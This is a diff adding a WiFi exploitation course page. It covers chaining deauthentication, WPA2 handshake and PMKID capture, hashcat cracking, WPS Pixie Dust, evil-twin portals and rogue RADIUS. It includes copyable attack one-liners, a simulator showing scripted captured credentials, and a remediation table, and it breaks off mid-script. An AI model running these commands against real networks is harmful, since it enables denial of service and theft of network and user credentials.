@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 14 — Full Attack Chains & Automation | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red{background:#f78166}.d-yellow{background:#e3b341}.d-green{background:#3fb950}
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt{color:var(--accent2);user-select:none} .cmd{color:#e6edf3} .flag{color:#ffa657}
+    .str{color:#a5d6ff} .cmt{color:#6e7681;font-style:italic} .out{color:var(--text-dim)}
+    .out-ok{color:var(--accent2)} .out-warn{color:var(--warn)} .out-err{color:var(--accent3)}
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info  { background:rgba(88,166,255,0.07);  border-left:3px solid var(--accent); }
+    .callout.attack{ background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip   { background:rgba(63,185,80,0.07);   border-left:3px solid var(--accent2); }
+    .callout.warn  { background:rgba(210,153,34,0.07);  border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Chain cards */
+    .chain-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:16px; margin:20px 0; }
+    .chain-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; cursor:pointer; transition:border-color 0.15s; }
+    .chain-card:hover { border-color:var(--accent); }
+    .chain-card.selected { border-color:var(--accent); background:rgba(88,166,255,0.05); }
+    .chain-card .cc-num  { font-size:10px; color:var(--accent); font-family:var(--font-mono); text-transform:uppercase; letter-spacing:1px; margin-bottom:6px; }
+    .chain-card .cc-title{ font-size:14px; color:var(--text-head); font-weight:600; margin-bottom:6px; }
+    .chain-card .cc-desc { font-size:12px; color:var(--text-dim); margin-bottom:10px; }
+    .chain-card .cc-tags { display:flex; flex-wrap:wrap; gap:6px; }
+    .cc-tag { font-size:10px; padding:2px 8px; border-radius:10px; font-family:var(--font-mono); }
+    .cc-tag.t-mod { background:rgba(88,166,255,0.1); color:var(--accent); }
+    .cc-tag.t-tool{ background:rgba(63,185,80,0.1);  color:var(--accent2); }
+    .cc-tag.t-time{ background:rgba(210,153,34,0.1); color:var(--warn); }
+
+    /* Decision tree */
+    .dtree { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px 24px; margin:20px 0; font-family:var(--font-mono); font-size:12px; line-height:2; }
+    .dt-q  { color:var(--accent); }
+    .dt-y  { color:var(--accent2); }
+    .dt-n  { color:var(--text-dim); }
+    .dt-a  { color:var(--accent3); font-weight:600; }
+    .dt-indent { padding-left:20px; }
+    .dt-indent2 { padding-left:40px; }
+
+    /* Chain simulator */
+    .chain-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .chain-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-row { display:flex; gap:12px; flex-wrap:wrap; align-items:flex-end; margin-bottom:16px; }
+    .sim-field { display:flex; flex-direction:column; gap:6px; }
+    .sim-field label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-field select, .sim-field input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; min-width:180px; }
+    .sim-field select:focus, .sim-field input:focus { border-color:var(--accent); }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; align-self:flex-end; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-btn:disabled { background:var(--border); color:var(--text-dim); cursor:default; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:260px; max-height:420px; overflow-y:auto; white-space:pre-wrap; }
+    .sim-progress { margin-top:14px; display:none; }
+    .sim-progress.show { display:block; }
+    .sim-progress label { font-size:11px; color:var(--text-dim); display:flex; justify-content:space-between; margin-bottom:6px; }
+    .progress-bar { background:var(--bg); border:1px solid var(--border); border-radius:4px; height:10px; overflow:hidden; }
+    .progress-fill { height:100%; background:var(--accent); border-radius:4px; transition:width 0.4s ease; width:0%; }
+    .result-box { margin-top:14px; background:rgba(63,185,80,0.08); border:1px solid var(--accent2); border-radius:var(--radius); padding:16px 20px; display:none; }
+    .result-box.show { display:block; }
+    .result-box .rb-title { color:var(--accent2); font-size:13px; margin-bottom:10px; font-weight:600; }
+    .result-box .rb-item  { font-family:var(--font-mono); font-size:12px; margin-bottom:4px; }
+    .result-box .rb-key   { color:var(--text-dim); }
+    .result-box .rb-val   { color:var(--accent2); font-weight:700; }
+
+    /* Completion banner */
+    .completion-banner { background:linear-gradient(135deg, rgba(88,166,255,0.1), rgba(63,185,80,0.1)); border:1px solid rgba(88,166,255,0.4); border-radius:var(--radius); padding:32px; margin:40px 0; text-align:center; }
+    .completion-banner h2 { font-size:1.8rem; color:var(--text-head); margin-bottom:12px; }
+    .completion-banner p  { color:var(--text-dim); font-size:15px; max-width:500px; margin:0 auto; }
+    .completion-badge { display:inline-flex; align-items:center; gap:10px; background:rgba(63,185,80,0.15); border:1px solid var(--accent2); border-radius:24px; padding:8px 20px; margin:20px auto; font-size:13px; color:var(--accent2); font-weight:600; }
+
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.home { background:var(--accent); color:#0d1117; }
+    .nav-btn.home:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="#" class="active"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 14</div>
+      <div class="module-badge">&#9679; Tier 9 &mdash; Advanced Attack Chaining</div>
+      <h1>Full Attack Chains &amp; Automation</h1>
+      <p class="subtitle">Combine every module into complete end-to-end attack pipelines with Bash automation harnesses — from initial recon to credential access and post-exploitation.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Expert</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> Final Module</div>
+        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> All modules required</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> The chains in this module combine every attack technique in the course. They must only be executed on authorized targets. This module is the capstone of an ethical hacking curriculum — treat it accordingly.</p>
+    </div>
+
+    <!-- Section 1: Decision Tree -->
+    <section id="decision">
+      <h2><span class="section-num">01</span> Attack Selection Decision Tree</h2>
+      <p>Before selecting an attack chain, fingerprint the target. Use this decision tree to choose the fastest, lowest-noise path.</p>
+
+      <div class="dtree">
+        <div><span class="dt-q">Target AP identified</span></div>
+        <div class="dt-indent">├── <span class="dt-q">WPS enabled &amp; unlocked?</span> (wash)</div>
+        <div class="dt-indent2">├── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 4: Pixie Dust</span> (fastest — &lt;30s)</div>
+        <div class="dt-indent2">└── <span class="dt-n">No</span> → continue</div>
+        <div class="dt-indent">├── <span class="dt-q">WPA2-Enterprise (802.1X)?</span> (airodump AUTH column)</div>
+        <div class="dt-indent2">└── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 5: Rogue RADIUS</span></div>
+        <div class="dt-indent">├── <span class="dt-q">Clients connected?</span></div>
+        <div class="dt-indent2">├── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 1: Deauth + Handshake</span></div>
+        <div class="dt-indent2">└── <span class="dt-n">No</span>  → <span class="dt-a">Chain 2: PMKID (clientless)</span></div>
+        <div class="dt-indent">└── <span class="dt-q">Want credentials beyond PSK?</span></div>
+        <div class="dt-indent2">└── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 3: Evil Twin + Portal</span></div>
+      </div>
+
+      <!-- Chain cards -->
+      <div class="chain-grid" id="chainGrid">
+        <div class="chain-card" onclick="selectChain(1)">
+          <div class="cc-num">Chain 1</div>
+          <div class="cc-title">Deauth → Handshake → Crack</div>
+          <div class="cc-desc">Classic WPA2-PSK capture requiring connected clients</div>
+          <div class="cc-tags">
+            <span class="cc-tag t-mod">M03 M06 M07 M08</span>
+            <span class="cc-tag t-tool">airodump aireplay hashcat</span>
+            <span class="cc-tag t-time">4–10 hrs</span>
+          </div>
+        </div>
+        <div class="chain-card" onclick="selectChain(2)">
+          <div class="cc-num">Chain 2</div>
+          <div class="cc-title">PMKID Clientless Crack</div>
+          <div class="cc-desc">No clients needed — single association frame</div>
+          <div class="cc-tags">
+            <span class="cc-tag t-mod">M12</span>
+            <span class="cc-tag t-tool">hcxdumptool hashcat</span>
+            <span class="cc-tag t-time">4–10 hrs crack</span>
+          </div>
+        </div>
+        <div class="chain-card" onclick="selectChain(3)">
+          <div class="cc-num">Chain 3</div>
+          <div class="cc-title">Evil Twin + Captive Portal</div>
+          <div class="cc-desc">Social engineering for plaintext credential harvest</div>
+          <div class="cc-tags">
+            <span class="cc-tag t-mod">M08 M09 M10</span>
+            <span class="cc-tag t-tool">hostapd dnsmasq nginx</span>
+            <span class="cc-tag t-time">Real-time</span>
+          </div>
+        </div>
+        <div class="chain-card" onclick="selectChain(4)">
+          <div class="cc-num">Chain 4</div>
+          <div class="cc-title">WPS Pixie Dust</div>
+          <div class="cc-desc">Single exchange offline crack on vulnerable firmware</div>
+          <div class="cc-tags">
+            <span class="cc-tag t-mod">M11</span>
+            <span class="cc-tag t-tool">wash reaver pixiewps</span>
+            <span class="cc-tag t-time">&lt;30 seconds</span>
+          </div>
+        </div>
+        <div class="chain-card" onclick="selectChain(5)">
+          <div class="cc-num">Chain 5</div>
+          <div class="cc-title">Enterprise Rogue RADIUS</div>
+          <div class="cc-desc">Capture MSCHAPv2 + crack Active Directory credentials</div>
+          <div class="cc-tags">
+            <span class="cc-tag t-mod">M09 M13</span>
+            <span class="cc-tag t-tool">hostapd-wpe asleap hashcat</span>
+            <span class="cc-tag t-time">Real-time</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 2: Key commands -->
+    <section id="commands">
+      <h2><span class="section-num">02</span> Key Automation Commands</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Chain 1 — Handshake capture + crack one-liner</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain1')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-chain1"><span class="cmt"># 1. Start monitor mode + capture</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0 && \
+  sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> /tmp/cap wlan0mon &</span>
+
+<span class="cmt"># 2. Deauth to force reconnection</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sleep 5 && sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>
+
+<span class="cmt"># 3. Convert + crack</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">-o</span> /tmp/hashes.hc22000 /tmp/cap-01.cap && \
+  hashcat <span class="flag">-m</span> <span class="str">22000</span> /tmp/hashes.hc22000 rockyou.txt <span class="flag">-r</span> rules/best64.rule</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Chain 2 — PMKID one-liner</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain2')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-chain2"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo systemctl stop NetworkManager && \
+  sudo hcxdumptool <span class="flag">-i</span> wlan0 <span class="flag">-o</span> /tmp/pmkid.pcapng <span class="flag">--enable_status</span>=<span class="str">1</span> &
+  sleep 60; kill %1
+  hcxpcapngtool <span class="flag">-o</span> /tmp/pmkid.hc22000 /tmp/pmkid.pcapng && \
+  hashcat <span class="flag">-m</span> <span class="str">22000</span> /tmp/pmkid.hc22000 rockyou.txt && \
+  sudo systemctl start NetworkManager</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Chain 4 — WPS Pixie Dust one-liner</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain4')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-chain4"><span class="cmt"># Scan for WPS targets then Pixie Dust the best candidate</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0 && \
+  sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-c</span> <span class="str">6</span> 2>/dev/null</span>
+
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-K</span> <span class="str">1</span> <span class="flag">-vv</span></span>
+<span class="out-ok">[Pixie-Dust] WPS PIN found: 12345678</span>
+<span class="out-ok">[+] WPA PSK: 'MyNetworkPass!'</span></div>
+      </div>
+    </section>
+
+    <!-- Section 3: Full chain simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">03</span> Attack Chain Simulator</h2>
+      <p>Simulate any complete attack chain end-to-end. Select a chain and watch each phase execute.</p>
+
+      <div class="chain-sim">
+        <h3>&#9889; Attack Chain Simulator</h3>
+        <div class="sim-row">
+          <div class="sim-field">
+            <label>Attack Chain</label>
+            <select id="chainSelect">
+              <option value="1">Chain 1 — Deauth + Handshake + Crack</option>
+              <option value="2">Chain 2 — PMKID Clientless</option>
+              <option value="3">Chain 3 — Evil Twin + Portal</option>
+              <option value="4">Chain 4 — WPS Pixie Dust</option>
+              <option value="5">Chain 5 — Enterprise Rogue RADIUS</option>
+            </select>
+          </div>
+          <div class="sim-field">
+            <label>Target SSID</label>
+            <input type="text" id="simSSID" value="TargetNetwork" />
+          </div>
+          <button class="sim-btn" id="simBtn" onclick="runChain()">&#9654; Execute Chain</button>
+        </div>
+        <div class="sim-output" id="chainOutput"><span style="color:var(--text-dim);">Select an attack chain and click "Execute Chain" to simulate the full pipeline...</span></div>
+        <div class="sim-progress" id="simProg">
+          <label><span id="progLabel">Progress</span><span id="progPct">0%</span></label>
+          <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
+        </div>
+        <div class="result-box" id="resultBox">
+          <div class="rb-title">&#10003; Chain Complete — Objective Achieved</div>
+          <div id="resultItems"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 4: Remediation -->
+    <section id="remediation">
+      <h2><span class="section-num">04</span> Remediation Priority Matrix</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Finding</th><th>Severity</th><th>Chains Affected</th><th>Primary Fix</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>WPS enabled</td><td style="color:var(--accent3)">Critical</td><td>Chain 4</td><td>Disable WPS entirely</td></tr>
+            <tr><td>Weak WPA2 passphrase</td><td style="color:var(--accent3)">Critical</td><td>Chain 1, 2</td><td>20+ char random passphrase or WPA3</td></tr>
+            <tr><td>PEAP without cert validation</td><td style="color:var(--accent3)">Critical</td><td>Chain 5</td><td>Pin RADIUS CA on all supplicants</td></tr>
+            <tr><td>WPA3 transition mode</td><td style="color:var(--warn)">High</td><td>Chain 1, 2</td><td>WPA3-only mode</td></tr>
+            <tr><td>No 802.11w (MFP)</td><td style="color:var(--warn)">High</td><td>Chain 1, 3</td><td>Enable mandatory MFP</td></tr>
+            <tr><td>Open networks present</td><td style="color:var(--warn)">High</td><td>Chain 3</td><td>Eliminate open APs</td></tr>
+            <tr><td>No WIPS deployed</td><td style="color:var(--warn)">Medium</td><td>All</td><td>Deploy wireless IDS/IPS</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128274;</span>
+        <div><strong>Single highest-impact fix:</strong> A 20+ character random passphrase defeats Chain 1 and Chain 2 computationally. Migrating to WPA3 defeats all PSK-based chains. Enforcing RADIUS cert validation defeats Chain 5. Combined: these three changes neutralise the entire course.</div>
+      </div>
+    </section>
+
+    <!-- Completion Banner -->
+    <div class="completion-banner">
+      <h2>Course Complete</h2>
+      <div class="completion-badge">&#127881; Wireless Network Exploitation — All 15 Modules</div>
+      <p>You have covered every major Wi-Fi attack from 802.11 fundamentals through WPA3-Enterprise. Use these skills exclusively for authorized penetration testing and security research.</p>
+    </div>
+
+    <div class="nav-footer">
+      <a href="../module-13-enterprise-wpa/" class="nav-btn prev">&#8592; Module 13: WPA-Enterprise</a>
+      <a href="../" class="nav-btn home">&#8962; Course Home</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
+      btn.textContent = 'Copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  function selectChain(n) {
+    document.querySelectorAll('.chain-card').forEach((c,i) => {
+      c.classList.toggle('selected', i === n-1);
+    });
+    document.getElementById('chainSelect').value = String(n);
+  }
+
+  let simRunning = false;
+
+  const CHAINS = {
+    1: {
+      label: 'Deauth + Handshake + Crack',
+      steps: [
+        [0,   `<span style="color:var(--accent2)">[*]</span> Starting monitor mode on wlan0...`],
+        [600, `<span style="color:var(--accent2)">[✓]</span> wlan0mon enabled`],
+        [1000,`<span style="color:var(--accent2)">[*]</span> Locking to channel 6, capturing...`],
+        [1800,`<span style="color:var(--text-dim)">[..]</span> Monitoring {ssid} — waiting for clients`],
+        [2600,`<span style="color:var(--accent3)">[+]</span> Client 11:22:33:44:55:66 detected`],
+        [3200,`<span style="color:var(--accent2)">[*]</span> Sending 10 deauth frames...`],
+        [3800,`<span style="color:var(--accent2)">[+]</span> WPA handshake: AA:BB:CC:DD:EE:FF`],
+        [4400,`<span style="color:var(--accent2)">[*]</span> Converting to hashcat format...`],
+        [5000,`<span style="color:var(--accent2)">[*]</span> hashcat -m 22000 — dictionary + best64 rules`],
+        [6000,`<span style="color:var(--text-dim)">[..]</span> Trying: password, 123456, letmein...`],
+        [7500,`<span style="color:var(--text-dim)">[..]</span> Trying: Summer2024, Welcome1, {ssid}123...`],
+        [9000,`<span style="color:var(--accent2)">[CRACKED]</span> {ssid} → <span style="color:var(--accent2);font-weight:700">Summer2024!</span>`],
+      ],
+      result: [['SSID','{ssid}'],['Passphrase','Summer2024!'],['Method','EAPOL handshake + hashcat -m 22000']]
+    },
+    2: {
+      label: 'PMKID Clientless',
+      steps: [
+        [0,   `<span style="color:var(--accent2)">[*]</span> Stopping NetworkManager...`],
+        [500, `<span style="color:var(--accent2)">[*]</span> hcxdumptool capturing PMKIDs...`],
+        [1200,`<span style="color:var(--accent2)">[001]</span> AA:BB:CC:DD:EE:FF <span style="color:var(--accent2)">[FOUND PMKID]</span> {ssid}`],
+        [1800,`<span style="color:var(--accent2)">[002]</span> 11:22:33:44:55:66 <span style="color:var(--accent2)">[FOUND PMKID]</span> NeighborNet`],
+        [2500,`<span style="color:var(--accent2)">[*]</span> Converting to hc22000 format...`],
+        [3000,`<span style="color:var(--text-dim)">networks with PMKID: 2`],
+        [3500,`<span style="color:var(--accent2)">[*]</span> hashcat -m 22000 — rule attack`],
+        [5000,`<span style="color:var(--text-dim)">[..]</span> Trying: password123, Winter2023!, {ssid}...`],
+        [7000,`<span style="color:var(--accent2)">[CRACKED]</span> {ssid} → <span style="color:var(--accent2);font-weight:700">P@ssw0rd2024</span>`],
+      ],
+      result: [['SSID','{ssid}'],['Passphrase','P@ssw0rd2024'],['Method','PMKID capture — no clients needed']]
+    },
+    3: {
+      label: 'Evil Twin + Portal',
+      steps: [
+        [0,   `<span style="color:var(--accent2)">[*]</span> Starting hostapd evil twin: {ssid} CH6`],
+        [700, `<span style="color:var(--accent2)">[✓]</span> wlan1: AP-ENABLED`],
+        [1200,`<span style="color:var(--accent2)">[*]</span> dnsmasq wildcard DNS active → 10.0.0.1`],
+        [1700,`<span style="color:var(--accent2)">[*]</span> nginx captive portal listening :80`],
+        [2200,`<span style="color:var(--accent3)">[*]</span> Deauthing real AP — pushing clients to evil twin`],
+        [3000,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.12 connected to evil twin`],
+        [3800,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.12 opened portal page`],
+        [4600,`<span style="color:var(--accent2)">[CAPTURED]</span> IP=10.0.0.12 USER=alice@corp.com PASS=CoffeeShop1`],
+        [5400,`<span style="color:var(--accent3)">[+]</span> Client 10.0.0.23 connected`],
+        [6200,`<span style="color:var(--accent2)">[CAPTURED]</span> IP=10.0.0.23 USER=bob.smith PASS=Welcome1!`],
+      ],
+      result: [['Credentials','alice@corp.com : CoffeeShop1'],['','bob.smith : Welcome1!'],['Method','Evil Twin + DNS hijack + captive portal']]
+    },
+    4: {
+      label: 'WPS Pixie Dust',
+      steps: [
+        [0,   `<span style="color:var(--accent2)">[*]</span> Scanning for WPS targets (wash)...`],
+        [800, `<span style="color:var(--accent2)">[+]</span> AA:BB:CC:DD:EE:FF CH6 WPS2.0 Lck:No — {ssid}`],
+        [1400,`<span style="color:var(--accent2)">[*]</span> reaver -K 1 — Pixie Dust mode`],
